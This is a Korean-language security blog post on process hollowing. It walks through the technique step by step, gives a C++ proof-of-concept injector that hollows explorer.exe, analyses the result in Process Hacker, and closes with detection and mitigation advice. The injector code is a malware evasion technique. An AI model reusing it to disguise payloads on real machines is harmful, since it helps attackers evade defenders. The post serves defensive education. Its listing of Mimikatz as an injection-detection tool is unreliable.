---
date: 2025-02-10T16:00:00
draft: false
description: 
featured_image: "cdn/threats/process_hollowing.png"
tags: ["process_hollowing", "CyberSecurity", "MalwareAnalysis", "ThreatDetection", "EDR_Security"]
title: "Process Hollowing: 공격 기법과 탐지 전략"
---

# 🤔1. Process Hollowing 이란? 

**Process Hollowing**은 T1055.012로 **Process Injection**의 서브 테크닉(Sub-technique)으로, **정상적인 프로세스의 메모리 주소 공간을 훼손**하여 악성 코드를 실행하는 기법을 말합니다. 🕵️‍♂️주로 권한 상 승 및 탐지 우회를 목적으로 사용되며, 대표적인 예로 **Meterpreter**, **Cobalt Strike** 등의 공격 도구에서 활용됩니다. 공격자는 정상적인 실행 파일을 로드한 후, 메모리의 코드를 악성 페이로드로 덮어 씌우는 방식으로 동작합니다.

이 기법은 보안 솔루션에 의해 탐지되기 어렵습니다. 🚨이유는 실행 중인 프로세스가 정상적인 파일과 동일한 경로를 가지며, 서명된 합법적인 프로그램처럼 보이기 때문입니다.

<!--more-->

![process_hollowing1](https://github.com/user-attachments/assets/524b4574-0aa7-4878-abc2-60694b47cf9e)

[사진 1] Process Hollowing

# 🛠️2. Process Hollowing의 주요 단계 

Process Hollowing은 일반적으로 다음과 같은 단계로 진행됩니다.

## 1) 프로세스를 일시정지 상태로 생성한다.

![process_hollowing2](https://github.com/user-attachments/assets/011a705f-b35a-4612-8c46-d9a2e70025d5)

[사진 2] Process Hollowing Step 1

![code1-1-1](https://github.com/user-attachments/assets/2cf8151c-6d40-40ac-aaca-e8ba105eb9ba)

[사진 3] Process Hollowing Step 1 (code)

정상 프로세스인 explorer.exe를 실행한다.

## 2) 프로세스의 ImageBase 주소를 구한다.

![process_hollowing3](https://github.com/user-attachments/assets/2d2c9524-e112-4798-91ce-b5e1bd2779d0)

[사진 4] Process Hollowing Step 2

![code1-2-1](https://github.com/user-attachments/assets/33b8e5cb-e8b8-4e48-ae71-3e418adbf250)

[사진 5] Process Hollowing Step 2 (code)

새로 생성된 프로세스의 이미지 베이스 주소를 가져온다.

## 3) 프로세스의 ImageBase 주소를 Unmapping 한다.

![process_hollowing4](https://github.com/user-attachments/assets/2d798777-6958-451d-a874-ab5422780f4a)

[사진 6] Process Hollowing Step 3

![image](https://github.com/user-attachments/assets/87cf1b03-cd7f-4e1e-aad7-3861171d7fb5)

[사진 7] Process Hollowing Step 3 (code)

원래 실행되던 explorer.exe의 메모리를 언맵하여 빈 상태로 만든다.

## 4) 프로세스의 ImageBase 주소에 새로운 이미지를 Mapping 한다.

![process_hollowing5](https://github.com/user-attachments/assets/8c892aca-1789-44c7-ac72-d04f3c4d4e9c)

[사진 8] Process Hollowing Step 4

![code2-1](https://github.com/user-attachments/assets/01677cfb-bee8-41ec-96ad-a13198237a8d)

[사진 9] Process Hollowing Step 4 (code1)

![code2-2](https://github.com/user-attachments/assets/9b99ed92-af05-498c-8e82-bddc06e1adad)

[사진 10] Process Hollowing Step 4 (code2)

- injector 객체를 이용해 악성 코드(malwareTarget)를 정상 프로세스에  주입할 준비를 한다.
- malwareTarget(2203648 바이트 크기의 PE 바이너리)을 pe 클래스를 이용해 로드한다.
- injector.alloc(malwr_size, imagebase, false); - 원래 프로세스가 사용하던 영역(imagebase)에 악성 코드 크기만큼 메모리를 할당한다.

## 5) 임시로 메모리 공간을 할당한다.

![process_hollowing6](https://github.com/user-attachments/assets/1f85d2b0-c132-4098-8c2d-569a877a5ac1)

[사진 11] Process Hollowing Step 5

![code2-3](https://github.com/user-attachments/assets/2c1dff38-7497-458f-b1c1-bcbfd166ea83)

[사진 12] Process Hollowing Step 5 (code)

- PE 파일을 로드할 새로운 메모리를 확보한다.
- getRelativeOffset을 통해 재배치 정보(Relocation Offset)를 계산한다.
- 새로운 베이스 주소를 악성 코드에 설정한다.

## 6) 임시로 할당한 메로리 공간에 악성 PE 파일의 헤더를 기록한다.

![process_hollowing7](https://github.com/user-attachments/assets/b490090d-752f-4bd6-9742-b1f111e42910)

[사진 13] Process Hollowing Step 6

![code2-4](https://github.com/user-attachments/assets/af1bb32e-2db0-480a-9223-5e14c6fa2c0a)

[사진 14] Process Hollowing Step 6 (code)

프로세스가 실행될 수 있도록 PE 파일의 헤더(Header) 정보를 먼저 기록한다.

## 7) 임시로 할당한 메모리 공간에 악성 PE 파일의 섹션을 기록한다.

![process_hollowing8](https://github.com/user-attachments/assets/ed71f701-290c-4acb-a2de-f0ab19c7c7a9)

[사진 15] Process Hollowing Step 7

![code2-5](https://github.com/user-attachments/assets/b7823331-c03f-4ba6-a327-efb282ea4811)

[사진 16] Process Hollowing Step 7 (code)

- PE 파일은 헤더(Header) + 섹션(Section) 구조로 이루어져 있다.
- getFirstSection()으로 첫 번째 섹션을 가져오고, writeSection()을 통해 각 섹션을 복사한다.
- getNextSection(currentSection)을 이용해 모든 섹션을 순차적으로 기록한다.

## 8) ImageBase를 기준으로 악성 PE 파일의 코드와 데이터를 재배치한다.

![process_hollowing9](https://github.com/user-attachments/assets/27a5e07d-3a2c-49fb-b459-263691682c05)

[사진 17] Process Hollowing Step 8

![code2-6](https://github.com/user-attachments/assets/9d78b686-3c61-42a4-b477-50abbe3929c4)

[사진 18] Process Hollowing Step 8 (code)

- PE 파일이 새로운 메모리 주소에 로드되었기 때문에, 원래 가정했던 베이스 주소와 다를 수 있다.
- relocate() 함수를 사용하여 상대적인 오프셋을 적용하여 올바르게 실행될 수 있도록 수정한다.

## 9) 재배치 완료된 악성 PE 파일을 정상 PE 파일 메모리 영역에 기록한다.

![process_hollowing10](https://github.com/user-attachments/assets/e1b11d53-6e2d-4c9b-8324-5c49c7646981)

[사진 19] Process Hollowing Step 9

![code2-7](https://github.com/user-attachments/assets/68a188f1-ea00-40ff-8421-40d72b52e7ba)

[사진 20] Process Hollowing Step 9 (code1)

![code3-1](https://github.com/user-attachments/assets/d45f46f2-bdf1-4f66-891a-7fa2f7c5d3fe)

[사진 21] Process Hollowing Step 9 (code2)

- injector.write()를 이용해 PE 파일 전체를 정상 프로세스 메모리에 쓴다.
- patchEntryPoint()를 사용하여 원래 프로세스의 진입점을 악성 코드의 진입점(Entry Point)으로 변경한다.

## 10) 코드의 시작 주소를 ImageBase를 기준으로 수정한 후에 프로세스를 재개한다.

![process_hollowing11](https://github.com/user-attachments/assets/d2695498-3cab-4993-8754-bf19d1310143)

[사진 22] Process Hollowing Step 10

![code3-2](https://github.com/user-attachments/assets/843278b8-1037-477a-bac9-a2f18285d4b9)

[사진 23] Process Hollowing Step 10 (code)

- resume()을 호출하여 정지 상태였던 프로세스를 다시 실행한다.
- 하지만 이 시점부터 실행되는 코드는 원래 explorer.exe가 아니라 악성 코드가 됨.

## Process Hollowing 과정 요약

1. 정상 프로세스(explorer.exe) 실행
2. 기존 PE 이미지를 언맵하여 제거
3. 악성 코드 주입을 위한 메모리 할당
4. PE 파일 로드 및 헤더 & 섹션 데이터 복사
5. 재배치(Relocation) 적용
6. Entry Point 수정
7. 프로세스 실행 재개 → 정상적인 프로세스로 위장하여 실행

![hollow_test_virustotal](https://github.com/user-attachments/assets/d0eaebf5-9319-4066-8612-48101f02d7dd)

[사진 24] 사용된 hollow_test.exe를 VirusTotal에 업로드한 결과 23/71에서 악성코드로 탐지함.

## **사용된 Process  Hollowing 코드**

```cpp
#include <Windows.h>

#include "process_.h"
#include "injector.h"

#include "pe.h"

WCHAR wszProcessPath[] = L"explorer.exe";

unsigned char malwareTarget[2203648] = { // explorer.exe의 바이너리 값 }
int WINAPI WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	PSTR lpCmdLine,
	INT nCmdShow
)
{
	process normalProcess;

	if (normalProcess.create(wszProcessPath, true, false))
	{
		ULONG_PTR imagebase = normalProcess.imagebase();

		if (normalProcess.unmap(imagebase, false)) // Step3
		{
			injector injector(normalProcess.handle());

			pe malwr(malwareTarget, 2203648);
			ULONG malwr_size = malwr.imageSize();

			LONG_PTR relativeOffset = 0;

			ULONG_PTR malwrAddr = injector.alloc(malwr_size, imagebase, false); // Step4: target process 메모리 할당

			if (malwrAddr != 0)
			{
				ULONG_PTR buildAddr = malwr.memAlloc(malwr_size); // Step5

				relativeOffset = malwr.getRelativeOffset(malwrAddr);
				malwr.setImagebase(malwrAddr);

				injector.writeHeader(buildAddr, (ULONG_PTR)malwr.peHeader(), malwr.peHeaderSize()); // Step6: 헤더를 기록

				// Step 7
				ULONG_PTR currentSection = malwr.getFirstSection();

				for (int nSection = 0; nSection < malwr.numberOfSection(); ++nSection)
				{
					injector.writeSection(buildAddr, (ULONG_PTR)malwr.peHeader(), currentSection);
					currentSection = malwr.getNextSection(currentSection);
				}

				// Step 8: relocate
				malwr.relocate(buildAddr, relativeOffset);

				// Step 9, 10
				injector.write(malwrAddr, buildAddr, malwr_size, false);
				normalProcess.patchEntryPoint(malwrAddr, malwr.addressOfEntryPoint());
				normalProcess.resume();
			}
		}
	}

	return 0;
}

```

---

---

# 3. 작성한 Process Hollowing 프로그램 실행 화면

![program](https://github.com/user-attachments/assets/57fff65a-d408-4b87-8c31-391668b18810)

[사진 25] hollow_test.exe 실행 화면

![process_list](https://github.com/user-attachments/assets/79ba792b-8559-4b0b-80c7-b22789f208d2)

[사진 26] 프로세스 목록

Process Hacker를 사용해 프로세스의 목록을 확인해본 결과, `hollow_test.exe` 프로세스 아래에 `explorer.exe(파일 탐색기)` 및 `conhost.exe`가 존재하는 것을 확인할 수 있다.

## 🔍 프로세스 분석

1. **`hollow_test.exe` 내부에 또 다른 `explorer.exe` 실행**
- 원래 `explorer.exe`는 시스템에서 자동으로 실행되는 프로세스이지만, 특정 실행 파일(`hollow_test.exe`)이 부모 프로세스로 작동하며 `explorer.exe`를 실행한 것은 매우 의심되는 행동입니다.
- 이는 정상적인 실행 방식이 아니라 악성 코드가 Hollowing 기법을 통해 기존 정상적인 프로세스를 가장했을 가능성이 있음을 나타냅니다.
1. **`conhost.exe` 존재**
- `conhost.exe`는 콘솔 프로그램을 지원하는 정상적인 Windows 프로세스이지만, `hollow_test.exe` 아래에서 실행된 점이 특이합니다.
- 악성 코드가 `conhost.exe`를 이용하여 쉘 명령어를 실행하는 경우도 있으므로 주의가 필요합니다.
1. **CPU 및 메모리 사용량 분석**
- `hollow_test.exe`가 높은 CPU 사용량을 보이지 않는다면, 실행된 악성 코드가 백그라운드에서 조용히 동작할 가능성이 있습니다.
- `WriteProcessMemory`, `SetThreadContext`, `ResumeThread` 등의 API 호출을 모니터링하여 추가적인 Hollowing이 발생하는지 확인해야 합니다.

![two_explorer](https://github.com/user-attachments/assets/fc3de4a3-034e-47b3-af0b-f2a8c488f52d)

[사진 27] explorer.exe 프로세스가 두 개인 것을 확인

## 1️⃣ 분석 포인트

### 1) explorer.exe 프로세스가 두 개 존재

- Windows에서는 일밙거으로 하나의 `explorer.exe`가 실행됩니다.
- 다중 `explorer.exe`가 존재하는 경우, **악성 코드가 Hollowing 기법을 사용했을 가능성**이 있습니다.

### 2) Parent-Child 관계 및 프로세스 생성 방식 확인

- 위 이미지에서는 **PID 9728**의 `explorer.exe`가 **PID 2296**의 `explorer.exe`의 **하위 프로세스로 실행**된 것을 알 수 있습니다.
- `explorer.exe`가 다른 `explorer.exe`의 자식 프로세스로 생성되는 것은 **일반적인 동작이 아닙니다.**
- 이는 공격자가 정상적인 `explorer.exe`를 Hollowing하여 실행했을 가능성이 높습니다.

### 3) 메모리 사용량과 실행 크기 차이

- **PID 2296 (`explorer.exe`)**: 86.25MB 메모리 사용
- **PID 9728 (`explorer.exe`)**: 5.05MB 메모리 사용
- 보통 `explorer.exe`는 상당한 메모리를 사용하지만, **5.05MB만 사용하는** **`explorer.exe`는 Hollowing으로 인해 정상적인 PE가 로드되지 않았을 가능성**이 큽니다.

![explorer_analysis](https://github.com/user-attachments/assets/877a4d15-49de-44f9-9204-7bedb1c5762d)

[사진 28] 두 개의 explorer.exe 프로세스 분석

## **1️⃣ 분석 포인트**

### **✅ (1) 정상적인 `explorer.exe` (PID 2296)**

- **경로:** `C:\Windows\Explorer.EXE` (정상적인 시스템 파일 경로)
- **실행 위치:** `C:\Windows\system32\`
- **실행 시작:** **3개월 전 (2024-10-30)**→ 정상적인 `explorer.exe`는 일반적으로 Windows 시작 시 실행되므로, 실행 시간이 오래된 것이 정상적입니다.
- **Parent Process:** `Non-existent process (4088)`→ `explorer.exe`는 시스템 부팅 시 `winlogon.exe`에 의해 실행되므로, 부모 프로세스가 존재하지 않는 것은 정상적인 경우가 많습니다.

### **🚨 (2) 의심스러운 `explorer.exe` (PID 9728)**

- **경로:** `C:\Windows\explorer.exe` (정상 파일처럼 보이지만, 실행 방식이 다릅니다.)
- **실행 위치:** `C:\Users\user\Desktop\hollow_test\x64\Debug\`→ ❗ **정상적인 `explorer.exe`는 `system32`에서 실행되어야 합니다. 하지만 데스크톱에 있는 다른 프로세스(hollow_test.exe)에서 실행되었습니다.**
- **실행 시작:** **3일 20시간 전 (2025-02-05)**
→ 시스템 부팅과 무관한 시점에서 `explorer.exe`가 새롭게 실행되었습니다.
- **Parent Process:** `hollow_test.exe (PID 2196)`→ ❗ `explorer.exe`는 일반적으로 `winlogon.exe`에 의해 실행되지만, **다른 프로세스(hollow_test.exe)가 부모로 지정됩니다..**→ **Process Hollowing** 공격 기법에서 자주 발생하는 패턴입니다.

---

## **2️⃣ Process Hollowing 의심 증거**

📌 **Hollowing 가능성이 높은 이유:**

- `hollow_test.exe`가 **Parent Process**로 지정되어 있으며, 이는 정상적인 `explorer.exe` 실행 방식이 아닙니다.
- `explorer.exe`가 비정상적인 **데스크톱의 Debug 폴더에서 실행되었습니다**.
- `explorer.exe`의 실행 시간이 3일 전에 수동으로 실행된 것으로 보이며, 이는 Windows 부팅과 관계없는 실행 기록입니다.

![analsys](https://github.com/user-attachments/assets/2e9ee03c-fe88-4dde-bb0b-7ffa345042b5)

[사진 29] 두 개의 explorer.exe 프로세스 분석

## **1️⃣ 스레드(Thread) 분석 포인트**

### **✅ (1) 정상적인 `explorer.exe` (PID 2296)**

- **TID 개수:** 13개 이상의 스레드가 실행 중입니다.
- **Start Address (시작 주소):**
    - `SHCore.dll!Ordinal172+0x100` (Windows Shell 관련 라이브러리)
    - `ntdll.dll!TpReleaseCleanupGroupMembers` (스레드 풀 관련)
    - `combase.dll!RoGetServerActivatableClassRegistration` (COM 기반 서비스 관련)
    - `WorkFoldersShell.dll!DllUnregisterServer` (WorkFolders 관련 프로세스)
    - 다양한 시스템 DLL (`GdiPlus.dll`, `SHCore.dll` 등)에서 시작된 정상적인 동작을 보입니다.
- **스레드 우선순위:** `Above normal` 포함, 다양한 우선순위가 존재합니다.
- **해석:**
    - 정상적인 `explorer.exe`는 **Windows의 다양한 시스템 기능을 사용하며, 여러 개의 스레드를 생성**하여 작업을 수행합니다.
    - 이는 Windows Shell 및 탐색기 기능을 담당하는 정상적인 프로세스 동작입니다.

---

### **🚨 (2) 의심스러운 `explorer.exe` (PID 9728)**

- **TID 개수:** **4개로 매우 적습니다.**
- **Start Address (시작 주소):**
    - `explorer.exe+0xa3a10` → ❗ **바이너리 코드에서 직접 실행된 스레드** (의심스럽습니다.)
    - `ntdll.dll!TpReleaseCleanupGroupMembers` (일반적인 Windows API)
- **스레드 우선순위:** 모든 스레드가 `Normal`로 설정되어 있습니다.
- **해석:**
    - **정상적인 `explorer.exe`와 비교했을 때, DLL 기반 스레드가 거의 없습니다.**
    - `ntdll.dll`의 `TpReleaseCleanupGroupMembers`는 일반적인 동작일 수 있지만, **단일 API 호출만으로 탐색기가 실행되는 것은 비정상적입니다.**
    - **가장 의심스러운 점은 `explorer.exe+0xa3a10` 주소에서 직접 실행된 스레드가 존재한다는 것입니다.**
        - 이는 **Process Hollowing 시 악성 페이로드가 인젝션되었을 때 자주 보이는 패턴**입니다.

---

## **2️⃣ Process Hollowing 가능성 및 추가 분석 필요**

📌 **Hollowing 가능성이 높은 이유:**

1. **TID 개수 차이:**
    - 정상적인 `explorer.exe`(PID 2296)는 **13개 이상의 다양한 시스템 스레드**를 포함합니다.
    - 의심스러운 `explorer.exe`(PID 9728)는 **4개만 존재하며, 대부분 `ntdll.dll`에서 실행됩니다.**
2. **비정상적인 실행 위치:**
    - `explorer.exe+0xa3a10`는 명확한 DLL 기반이 아닌 **메모리 내부 코드 실행 형태**로 보이며, **Hollowing 흔적**으로 의심됩니다.
3. **Parent Process (`hollow_test.exe`)의 존재:**
    - 원래 `explorer.exe`는 `winlogon.exe`에서 생성되어야 하지만, **비정상적인 프로세스 (`hollow_test.exe`)에서 실행되었습니다.**

---

이처럼 **Process Hollowing** 기법은 표면적으로는 정상적인 프로세스와 구별하기 어렵기 때문에, 단순한 식별 방식만으로는 탐지하기에 한계가 있습니다. 따라서, 실행 흐름의 세부적인 분석과 메모리 검사, 스레드 패턴 비교 등의 **정교한 포렌식 기법**이 필수적으로 요구됩니다.

# 🔎4. Process  Hollowing 탐지 기법 

Process Hollowing은 정교한 공격 기법이지만, 보안 솔루션에서는 다양한 방법으로 이를 탐지할 수 있습니다.

## 📡1) API 호출 모니터링 

`CreateProcess`, `NtUnmapViewOfSection`, `VirtualAllocEx`, `WriteProcessMemory`, `SetThreadContext`, `ResumeThread`와 같은 API 호출이 연속적으로 발생하는 경우 의심해야 합니다.

- EDR 및 SIEM 로그에서 해당 API의 호출 패턴을 분석하면 이상 핻옹을 감지할 수 있습니다.

## 🏴‍☠️2) 실행 파일과 메모리 매핑 비교 

정상적인 실행 파일과 메모리에 로드된 실행 파일이 다른 경우 Process Hollowing이 발생했을 가능성이 높습니다.

- `SigCheck` 같은 도구를 사용하여 실행 파일의 서명 및 무결성을 검증할 수 있습니다.
- `Volatility`를 이용하여 메모리 내 실행 중인 프로세스를 분석하고, 실행 파일과 비교하여 불일치를 탐지할 수 있습니다.

## 🧩3) Parent-Child Process 관계 분석

공격자가 원래 실행된 프로세스를 중지하고, 새로운 프로세스를 Hollowing 형태로 실행하면 Parent-Child 관계가 비정상적으로 변경될 수 있습ㄴ니다.

- 예를 들어, `explorer.exe`에서 `cmd.exe`가 실행되는 것은 정상적이지만, `winlogon.exe`에서 `powershell.exe`가 실행되면 의심할 필요가 있습니다.
- Sysmon을 활요하면 Parentj-Child 관계를 추적할 수 있습니다.

## 📊4) 코드 인젝션 탐지 

Process Hollowing의 핵심은 정상 프로세스에 악성 코드를 주입하는 것입니다. 이를 탐지하기 위해 프로세스 내 코드 영역을 주기적으로 스캔하여 실행 가능한 메모리 페이지가 변경되었는지 확인할 수 있습니다.

- `Mimikatz`, `PE-Sieve` 같은 도구를 사용하면 메모리에서 의심스러운 코드 삽입 여부를 확인할 수 있습니다.

# 🛡️5. Process Hollowing 대응 방안 

Process Hollowing 공격을 효과적으로 차단하려면 다음과 같은 보안 조치를 적용하는 것이 중요합니다.

## 1) EDR 및 SIEM 솔루션 활용

EDR 및 SIEM을 활용하여 **API 호출 패턴 분석**, **실행 파일 무결성 검사**, **Parent-Child 관계 모니터링** 등의 탐지 기법을 자동화할 수 있습니다.

## 2) 공격 표면 줄이기

- `AppLocker` 또는 `Windows Defender Application Control (WDAC)`을 사용하여 의심스러운 실행 파일의 실행을 차단합니다.
- 메모리 보호 기술(ASLR, DEP, CFGj)을 활성화하여 코드 인젝션을 어렵게 만듭니다.

## 3) 시스템 로그 분석 및 탐지 필터 적용

- `Sysmon` 및 `Windows Event Logging`을 활성화하여 의심스러운 API 호출을 감지하고 필터링한다.

## 4) 정기적인 포렌식 분석 수행

- `Volatility`, `Procmon`, `PE-Sieve` 등을 사용하여 주기적으로 시스템을 스캔하고 이상 행위를 분석한다.

# 🏆6. 결론 

Process Hollowing은 공격자들이 많이 사용하는 강력한 코드 인젝션 기법입니다. 하지만 정교한 탐지 기법을 적용하면 충분히 대응할 수 있습니다. 특히 **API 호출 모니터링, 실행 파일과 메모리 비교, Parent-Child 관계 분석** 등을 활용하면 공격을 효과적으로 탐지할 수 있습니다.

🔒보안 담당자는 지속적으로 **MITRE ATT&CK 프레임워크의 T1055 (Process Injection) 기법을 분석하고, 탐지 필터를 최신 상태로 유지**해야 한다. 또한, 정기적인 보안 검토와 포렌식 분석을 통해 조직의 보안 수준을 강화해야 할 것이다.
